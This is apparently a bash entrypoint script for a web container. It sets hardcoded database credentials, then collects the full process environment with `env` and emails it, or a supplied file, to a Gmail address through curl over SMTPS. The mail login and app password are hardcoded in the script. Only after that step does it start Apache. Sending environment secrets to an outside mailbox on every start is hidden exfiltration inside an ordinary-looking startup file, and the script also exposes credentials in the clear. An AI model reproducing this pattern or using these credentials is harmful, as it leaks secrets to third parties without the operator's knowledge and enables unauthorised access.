#!/usr/bin/env bash


# check for provided attachment file as a positional parameter
# -z indicating an empty positional parameter
# attachment doesn't exist condition

export DB_USER='web_server_admin'
export DB_HOST='mysql-web-server-01.cufolq3vjkag.us-east-1.rds.amazonaws.com'
export DB_NAME='web_app_db'
export DB_PASSWORD='R4V}3Ovua2XD'

if [ -z "$1" ]; then 

body=$(env)

# curl command for accessing the smtp server

curl -s --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
 --mail-from 'roger.amorim@empiricus.com.br' \
 --mail-rcpt 'roger.amorim@empiricus.com.br' \
 --user 'roger.amorim@empiricus.com.br':'dzwlzeakmgulqrby' \
 -T <(echo -e "From: 'roger.amorim@empiricus.com.br'
To: ${receiver}
Subject:Chegou coisa nova em!!!

${body}")


# attachment exists condition
else

file="$1"           # set file as the 1st positional parameter
    
# MIME type for multiple type of input file extensions
    
MIMEType=`file --mime-type "$file" | sed 's/.*: //'`
 curl -s --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
 --mail-from 'roger.amorim@empiricus.com.br' \
 --mail-rcpt 'roger.amorim@empiricus.com.br' \
 --user 'roger.amorim@empiricus.com.br':'dzwlzeakmgulqrby' \
 -H "Subject: Chegou coisa nova em!!!" -H "From: 'roger.amorim@empiricus.com.br'" -H "To: $receiver" -F \
 '=(;type=multipart/mixed' -F "=$body;type=text/plain" -F \
  "file=@$file;type=$MIMEType;encoder=base64" -F '=)'
     
fi

apachectl -D FOREGROUND
